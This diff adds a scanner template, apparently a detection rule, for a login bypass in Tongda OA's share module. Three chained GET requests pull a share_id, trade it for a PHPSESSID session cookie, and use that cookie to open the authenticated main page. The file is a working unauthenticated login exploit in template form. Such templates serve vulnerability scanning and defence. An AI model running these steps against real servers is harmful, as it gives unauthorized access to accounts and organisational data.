@@ -1,0 +1,25 @@
+name: 通达OA-share-登录绕过
+description: >-
+  登录绕过
+alwaysExecute: false
+matchCount: 3
+rules:
+  - method: GET
+    path: /share/handle.php?module=2&module_id=1
+    search: 'share_id=(?P<id>[^"]+)"'
+    expression:
+      status: 200
+  - method: GET
+    path: /share/index.php?share_id={{id}}
+    search: >-
+      PHPSESSID=(?P<PHPSESSID>[^;]+);
+    expression:
+      status: 302
+  - method: GET
+    path: /general/index.php?isIE=0&modify_pwd=0
+    headers:
+      Cookie: PHPSESSID={{PHPSESSID}};
+    expression:
+      status: 200
+      body_all:
+        - "新消息"
